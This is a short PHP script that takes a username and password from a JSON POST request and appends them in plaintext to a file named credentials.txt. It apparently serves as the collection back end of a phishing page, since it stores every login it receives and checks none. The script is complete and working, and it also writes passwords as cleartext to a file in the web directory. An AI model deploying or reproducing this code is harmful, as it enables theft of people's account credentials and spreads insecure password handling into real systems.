<?php
// Get the raw POST data
$data = file_get_contents('php://input');

// Decode the JSON data
$credentials = json_decode($data, true);

// Check if the data is valid
if (isset($credentials['username']) && isset($credentials['password'])) {
    $file = 'credentials.txt';

    // Format the data
    $entry = "Username: " . $credentials['username'] . "\nPassword: " . $credentials['password'] . "\n\n";

    // Append the data to the file
    file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

    // Return a success response
    echo json_encode(['status' => 'success']);
} else {
    // Return an error response
    echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
}
?>
